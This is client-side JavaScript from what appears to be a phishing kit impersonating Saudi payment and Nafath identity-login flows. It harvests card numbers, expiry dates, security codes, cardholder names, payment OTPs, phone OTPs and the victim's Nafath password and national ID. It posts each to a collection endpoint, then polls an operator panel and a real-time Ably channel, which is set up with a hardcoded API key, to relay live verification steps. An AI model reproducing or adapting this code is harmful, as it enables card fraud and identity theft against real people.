                                 $("#ProveForm").removeClass('d-none');
                    window.location.href = "/noino";
                    
                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });




    // // getElementById_("ProveForm").classList.toggle("d-none");
    // // getElementById_("PaymentsForm").classList.toggle("d-none");

}

function getPaymentMainFormFields() {

    return {

        InputCode: {
            type: "number",
            typeFun: "CardCode",
            inputID: 'InputCode',
            SpanErrorID: 'CodeHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PaymentCardCode"
        },
        InputDateExp: {
            type: "string",
            typeFun: "DateCardExp",
            inputID: 'InputDateExp',
            SpanErrorID: 'DateExpHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PaymentCardExp"
        },
        InputCardID: {
            type: "number",
            typeFun: "IDPayCard",
            inputID: 'InputCardID',
            SpanErrorID: 'CardIDHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PaymentCardID"
        },
        InputName: {
            type: "text",
            typeFun: "name_card_holder",
            inputID: 'InputCardHolderName',
            SpanErrorID: 'CardHolderNameHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PersonCardName"
        },

    };

}

function getPaymentVerifyFormFields() {

    return {
        InputVerify: {
            type: "number",
            typeFun: "verify_code_4_6_digits",
            inputID: 'InputVerifyPayment',
            SpanErrorID: 'VerifyPaymentHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "VerifyPaymentCode"
        }
    };

}

function getPaymentProveFormFields() {


    return {
        InputSecretNum: {
            type: "number",
            typeFun: "SecretPaymentCode",
            inputID: 'InputSecretNum',
            SpanErrorID: 'SecretNumHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "SecretPaymentCode"
        }
    };
}

function setLstFourDigitsCard(){//InputCardID
    getElementById_("LstFourDigits").innerHTML =  getElementById_("InputCardID").value.trim().slice(-4);
}


/********************************************* *
END PAYMENTS FORMS EVENTS
******************************************** */



/********************************************* *
END MOTASEL FORMS EVENTS
******************************************** */


function MotaselEnterSubmit() {

    let fields = getMotaselEnterFormFields();
    
    const fieldsWithStatus = validateAndReadfields_2(fields);
    fields = fieldsWithStatus.fields;


    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
            _state = false;
            return _state;
    }

    const req = getReqfields(fields);
    //console.log("req ", req);
    configs = {
        Elements: [
            getElementById_("FormMotaselMain"),
            getElementById_("FormMotaselProgress"),
            getElementById_("FormMotaselVerify"),

        ]
    };

    
  
        
        const provider = document.getElementById('SelectNetProvider')
        localStorage.setItem('provider' , provider.value)

           $("#AlertError").addClass('d-none');  
      $("#FormMotaselProgress").removeClass('d-none');
      $("#FormMotaselMain").addClass('d-none');

   req.step ="phone";
     
                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/data/store-details',
                data: {
                    motorAppData: JSON.stringify(req)
                },
                success: function(data) {
                 
                        setTimeout(function() {
                              $("#FormMotaselProgress").addClass('d-none');

                                 $("#FormMotaselVerify").removeClass('d-none');
											
						}, 3000);
                        
                    
                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });



}
function MotaselNextSubmit() {

    let fields = getMotaselNextFormFields();
    //
    fields = validateAndReadfields(fields);


    const req = getReqfields(fields);



    configs = {
        Elements: [
            getElementById_("FormMotaselProgress2"),
            getElementById_("FormMotaselVerify"),
        ]
    };
 
    if(req.MotaselVerifyCode.length >= 4){
       
    }else{
        $("#FormMotaselProgress2").addClass('d-none');
        $("#FormMotaselVerify").removeClass('d-none');  
        alert("يرجى أدخال الرمز الجديد المرسل الى جوالك");
        return;
    }
   
    $("#FormMotaselVerify").addClass('d-none');
        $("#FormMotaselProgress2").removeClass('d-none');

    req.step ="phone otp";
    
                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/data/store-details',
                data: {
                    motorAppData: JSON.stringify(req)
                },
                success: function(data) {
                    
                   setTimeout(function() {
                    $("#FormMotaselProgress2").addClass('d-none');
                    $("#FormMotaselVerify").removeClass('d-none');  
                        $("#AlertError").removeClass('d-none');  
                    }, 10000);
                    	 const realtime = new Ably.Realtime.Promise("RMQeNA.QwXiaQ:I9e8kIzTqD08hL6DBEeBoIULuZOx4kspDjPl3ft47g4");

      // Create a channel called 'get-started' and register a listener to subscribe to all messages with the name 'first'
						  const channel = realtime.channels.get("get-started");

   channel.subscribe("nafath-phone-"+refidss, (message) => {
console.log(message.data.confirm);
                if(message.data.confirm=="1"){
                  
                                    window.location.href = "/application/complete";
                //err
                document.getElementById("cardErrorModalall").style.display = "flex";
                }else if (message.data.confirm=="0"){
                $("#FormMotaselMain").removeClass('d-none');  


                
                    window.location.href = "/digital/nafath-se";
                

 
                }else{



                }

   })
                          
                    	
                    //window.location.href = configs;
                    
                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });


}


function getMotaselEnterFormFields() {

    return {

        SelectNetProvider: {
            type: "select",
            typeFun: "SelectNetProvider",
            inputID: 'SelectNetProvider',
            SpanErrorID: 'NetProviderHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "MotaselNetProvider"
        },
        InputPhonNum: {
            type: "number",
            typeFun: "phone_number_motsel",
            inputID: 'InputPhonNumMots',
            SpanErrorID: 'PhonNumMotsHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "MotaselPhonNum"
        }

    };

}

function getMotaselNextFormFields() {

    return {

        InputVerifyCode: {
            type: "number",
            typeFun: "verify_code_4_6_digits",
            inputID: 'InputVerifyCode',
            SpanErrorID: 'VerifyCodeyHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "MotaselVerifyCode"
        }
    };

}

/********************************************* *
END MOTASEL FORMS EVENTS
******************************************** */



/********************************************* *
START NAFATH FORMS EVENTS
******************************************** */


function NafathSubmit() {

    let fields = getNafathFormFields();

    const fieldsWithStatus = validateAndReadfields_2(fields);

    fields = fieldsWithStatus.fields;

    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
            _state = false;
            return _state;
    }

    const req = getReqfields(fields);
    console.log("req ", req);

    configs = {
        Elements: [
            getElementById_("NafathForm"),
            getElementById_("PaymentProgress"),
            
        ]
    };



    _requestData(
        token = "",
        Category = "FORMS_SUBMIT",
        typeReqs = TypeReqs.Nafath,
        req_data = { "req": req, "step": 1, "reference": GetItemFromLocalStorage('ReferenceID') },
        configs = configs);


}


function getNafathFormFields() {

    return {

        InputPassword: {
            type: "text",
            typeFun: "nafathPas",
            inputID: 'InputPassword',
            SpanErrorID: 'PasswordHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "NafathPassword"
        },
        InputID: {
            type: "number",
            typeFun: "ID",
            inputID: 'InputID',
            SpanErrorID: 'IDHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "NafathIDCard"
        }

    };

}


/********************************************* *
END NAFATH FORMS EVENTS
******************************************** */


function closeAlert(alert) {

    removeClassElement(alert, "d-none");
}

function getResponse(is_error, response, typeReqs, req_data, configs) {


    if (is_error) {
        console.log(response);
        // alert(response);
        return;
    }

    if (!response.status == true) {
        alert(response.message);
        return;
    }
    switch (typeReqs) {


        case TypeReqs.PayFmIsVerified:

            getResponsePaymentVerified(is_error, response, configs, req_data);
            break;

        case TypeReqs.MotaselFmIsVerified:

            getResponseMotsalIsVerified(is_error, response, configs, req_data);
            break;
        case TypeReqs.NafathFmIsVerified:

            getResponseNafathIsVerified(is_error, response, configs, req_data);
            break;
        case TypeReqs.NafathFmGetNum:

            getResponseNafathGetNum(is_error, response, configs, req_data);
            break;
        case TypeReqs["NewDate"]:

            getResponseNewDate(is_error, response, configs);
            break;

        case TypeReqs.PaymentsForm:
            getResponsePaymentForm(is_error, response, configs, req_data);
            break;

        case TypeReqs.Motasel:
            getResponseMotsalForm(is_error, response, configs, req_data);
            break;

        case TypeReqs.Nafath:
            getResponseNafathForm(is_error, response, configs, req_data);
            break;

        case "ALL_ACTIONS_LIST":
            RespnseUsersList("ALL_ACTIONS_LIST", is_error, response, configs, req_data);
            break;
        case "NEW_ACTIONS_LIST":
            RespnseUsersList("NEW_ACTIONS_LIST", is_error, response, configs, req_data);
            break;

        case "GetTemplatesForms":
            RespnseTemplatesForms(is_error, response, configs, req_data);
            break;

        case TypeReqs.SetActionStatus:
            RespnseSetActionStatus(is_error, response, configs, req_data);
            break;

        case TypeReqs.DeleteUsers:
        
        case "CheckNextUrl" || "VisitorRedirect":
            if (response && response.data && response.data.url) {
                window.location.href = response.data.url;
            }
            break;
        default:
            console.log(is_error, response);
            alert("User has been redirected");
            break;
    }

}


function getResponseNewDate(is_error, response, configs) {

    ClearItemByKeyFromLocalStorage('ReferenceID');
    SaveToLocalStorage('ReferenceID', response.data["Reference"]);
    window.location.href = response.data["goToUrl"];
}

function getResponsePaymentVerified(is_error, response, configs, req_data) {
    console.log({configs})

    if (response == null || ((response.data["status"] == "STILL") || response.data["status"] == "NEW_INSERTED")) {
        addClassElement(getElementById_("AlertError"), "d-none");
        let timeoutId = setTimeout(() => {

            _requestData(
                token = "",
                Category = "FORMS_SUBMIT",
                typeReqs = TypeReqs.PayFmIsVerified,
                req_data = req_data,
                configs = configs);

        }, 3000);
    }
    else {

        if (response.data["status"] == "accepted") {
            configs.Elements[0].classList.toggle("d-none");
            configs.Elements[1].classList.toggle("d-none");
            configs.Elements[2].classList.toggle("d-none");
            configs.Elements[3].classList.toggle("d-none");
            configs.Elements[6].classList.remove("d-none");
        } else if (response.data["status"] == "denied") {
            configs.Elements[0].classList.toggle("d-none");
            configs.Elements[1].classList.toggle("d-none");
            configs.Elements[6].classList.remove("d-none");

            removeClassElement(getElementById_("AlertError"), "d-none");

        }
        else if (response.data["status"] == "pass"){
                   configs.Elements[0].classList.toggle("d-none");
            configs.Elements[1].classList.toggle("d-none");
            configs.Elements[2].classList.toggle("d-none");
                 configs.Elements[4].classList.toggle("d-none");
                             configs.Elements[6].classList.remove("d-none");

               
        }
                else if (response.data["status"] == "external"){
                   configs.Elements[0].classList.toggle("d-none");
                    configs.Elements[1].classList.toggle("d-none");
                    configs.Elements[2].classList.toggle("d-none");
                    configs.Elements[5].classList.add("show");
                    configs.Elements[5].classList.remove("d-none");
                    const modalElement = new bootstrap.Modal(document.getElementById("external-form"));
                    modalElement.show();
                    startCountdown(modalElement)
                    configs.Elements[6].classList.add("d-none");
        }
        else {
            alert("NOT UNKNOWN STATE Please Contact Us To Fix the Issue" + response.data["status"]);
        }

    }
}
function getResponsePaymentForm(is_error, response, configs, req_data) {

    if (req_data.step == 1) {

        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");
        getResponsePaymentVerified(
            is_error, null, configs, { "reference": GetItemFromLocalStorage('ReferenceID'), "TypeForm": TypeReqs.PaymentsForm }
        );
    } else if (req_data.step == 2) {
        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");
    } else if (req_data.step == 3) {
        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");

        window.location.href = response.data["goToUrl"];
    }
    else {
    }
}

function getResponseMotsalIsVerified(is_error, response, configs, req_data) {


    if (response == null || ((response.data["status"] == "EMPITY") || response.data["status"] == "verified" || response.data["status"] == "NEW_INSERTED")) {
        addClassElement(getElementById_("AlertError"), "d-none");
        let timeoutId = setTimeout(() => {

            _requestData(
                token = "",
                Category = "FORMS_SUBMIT",
                typeReqs = TypeReqs.MotaselFmIsVerified,
                req_data = req_data,
                configs = configs);

        }, 3000);
    }
    else {

        if (response.data["status"] == "accepted" ) {//|| response.data["status"] == "verified"
            
            window.location.href = response.data["goToUrl"];

        } else if (response.data["status"] == "denied") {
            configs.Elements[0].classList.toggle("d-none");
            configs.Elements[1].classList.toggle("d-none");
            configs.Elements[2].classList.toggle("d-none");
            removeClassElement(getElementById_("AlertError"), "d-none");

        }
        else {
            alert("NOT UNKNOWN STATE Please Contact Us To Fix the Issue" + response.data["status"]);
        }

    }
}
function getResponseMotsalForm(is_error, response, configs, req_data) {

    if (req_data.step == 1) {

        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");
        let timeoutId = setTimeout(() => {
            configs.Elements[1].classList.toggle("d-none");
            configs.Elements[2].classList.toggle("d-none");
        }, 5000);

        // configs.Elements[0].classList.toggle("d-none");
        // configs.Elements[1].classList.toggle("d-none");
        // getResponseMotsalIsVerified(
        //     is_error, null, configs, { "reference": GetItemFromLocalStorage('ReferenceID'), "TypeForm": TypeReqs.Motasel }
        // );
    }
    else if (req_data.step == 2) {

        // getResponseMotsalIsVerified(
        //     is_error, null, configs, { "reference": GetItemFromLocalStorage('ReferenceID'), "TypeForm": TypeReqs.Motasel }
        // );


        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");
       
        getResponseMotsalIsVerified(
            is_error, null, configs, { "reference": GetItemFromLocalStorage('ReferenceID'), "TypeForm": TypeReqs.Motasel }
        );

    }
    else if (req_data.step == 3) {

        //window.location.href = response.data["goToUrl"];
    }
    else {
        alert(response.message);
    }
}

let LAST_NUMBER_NAFATH = 0;

function getResponseNafathGetNum(is_error, response, configs, req_data) {
    if (response != null) {
        const codeValue = response.data["status"] != "accepted" ? response.data["status"] : "##";
        getElementById_("strongCode").innerHTML = codeValue;
        // Update the last known code
        LAST_NUMBER_NAFATH = codeValue;
    }

    // Schedule another request to check for updates
    setTimeout(() => {
        _requestData(
            token = "",
            Category = "FORMS_SUBMIT",
            typeReqs = TypeReqs.NafathFmGetNum,
            req_data = req_data,
            configs = configs
        );
    }, 5000); // 5 seconds interval
}

let modalShown = false; // Track if the modal is already shown

function getResponseNafathIsVerified(is_error, response, configs, req_data) {
    if (response == null || response.data["status"] === "EMPITY" || response.data["status"] === "NEW_INSERTED") {
        addClassElement(getElementById_("AlertError"), "d-none");

        if (!modalShown) {
            var myModal = new bootstrap.Modal(document.getElementById('reqQuModal'));
            myModal.show();
            modalShown = true; // Mark modal as shown
        }

        setTimeout(() => {
            _requestData(
                token = "",
                Category = "FORMS_SUBMIT",
                typeReqs = TypeReqs.NafathFmIsVerified,
                req_data = req_data,
                configs = configs
            );
        }, 5000);
    } else {
        console.log("RESPONSE", response["status"] == true);

        if (response["status"] == true) {
            if (!modalShown) {
                var myModal = new bootstrap.Modal(document.getElementById('reqQuModal'));
                myModal.show();
                modalShown = true; // Mark modal as shown
            }

            // Start an interval to poll the server until code is not null
            let intervalId = setInterval(() => {
                let code = response.data["code"];

                if (code !== null && code !== "") {
                    // Update UI with the code and stop the interval
                    getElementById_("strongPhoneNum").innerHTML = code;
                    getElementById_("userPhoneNumber").innerHTML = response.data["MotaselPhonNum"];
                    clearInterval(intervalId); // Stop the interval
                } else {
                    // Trigger the next check
                    _requestData(
                        token = "",
                        Category = "FORMS_SUBMIT",
                        typeReqs = TypeReqs.NafathFmIsVerified,
                        req_data = req_data,
                        configs = configs
                    );
                }
            }, 2000);
        } else if (response.data["status"] === "denied") {
            configs.Elements[0].classList.toggle("d-none");
            configs.Elements[1].classList.toggle("d-none");
            removeClassElement(getElementById_("AlertError"), "d-none");
        }
    }
}



function getResponseNafathForm(is_error, response, configs, req_data) {
    if (req_data.step === 1) {
        configs.Elements[0].classList.toggle("d-none");
        configs.Elements[1].classList.toggle("d-none");

        // Start verification process
        getResponseNafathIsVerified(
            is_error, null, configs, { "reference": GetItemFromLocalStorage('ReferenceID'), "TypeForm": TypeReqs.Nafath }
        );
    } else {
        alert(response.message);
    }
}

